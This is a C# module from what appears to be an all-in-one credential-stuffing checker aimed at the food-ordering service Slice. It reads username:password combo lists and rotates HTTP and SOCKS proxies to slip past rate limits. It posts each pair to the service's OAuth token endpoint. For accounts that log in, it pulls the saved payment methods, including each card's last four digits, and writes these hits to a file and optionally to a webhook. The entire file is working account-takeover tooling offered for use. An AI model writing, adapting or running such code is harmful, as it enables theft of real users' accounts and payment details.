using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class SliceLifemod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.AllowAutoRedirect = false;
                            req.IgnoreProtocolErrors = true;
                            req.UserAgent = "okhttp/3.13.1";
                            var str = "password=" + array[1] + "&grant_type=password&username=" + array[0];
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var text2 = req.Post("https://coreapi.slicelife.com/oauth/token", str,
                                "application/x-www-form-urlencoded").ToString();
                            var flag9 = text2.Contains("\"Unauthorized\"");
                            if (flag9)
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                            else if (text2.Contains("\"access_token\""))
                            {
                                var access_token = Parse(text2, "access_token\":\"", "\",\"");
                                req.AddHeader("Authorization", "Bearer " + access_token);
                                var text3 = req
                                    .Get("https://coreapi.slicelife.com/api/v1/payment_methods?include_paypal=1")
                                    .ToString();
                                var text4 = Parse(text3, ",\"last_four\":\"", "\",\"");
                                var text5 = Parse(text3, ",\"payment_type\":\"", "\",\"");
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Slicelife_hits",
                                    array[0] + ":" + array[1] + " | Last4Digits: " + text4 + " | PaymentType: " +
                                    text5);
                                if (Program.lorc == "LOG")
                                    Settings.PrintHit("Slicelife",
                                        array[0] + ":" + array[1] + " | Last4Digits: " + text4 + " | PaymentType: " +
                                        text5);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(
                                        array[0] + ":" + array[1] + " | Last4Digits: " + text4 + " | PaymentType: " +
                                        text5, "Slicelife Hits");
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}